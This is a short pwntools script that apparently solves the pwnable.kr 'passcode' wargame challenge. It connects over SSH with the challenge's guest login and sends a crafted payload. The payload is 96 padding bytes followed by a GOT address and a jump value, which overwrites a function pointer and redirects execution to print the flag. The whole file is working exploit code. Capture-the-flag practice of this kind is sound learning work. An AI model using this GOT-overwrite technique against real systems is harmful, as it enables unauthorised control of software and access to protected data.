from pwn import *
target = ssh(host = "pwnable.kr",port = 2222,user = 'passcode',password = 'guest')
p = target.process('./passcode')
p.recvuntil('beta.\n')
payload = 'a'*96 + p32(0x0804a000)  + '\n' + '134514147\n'
p.sendline(payload)
log.success(p.recvall())
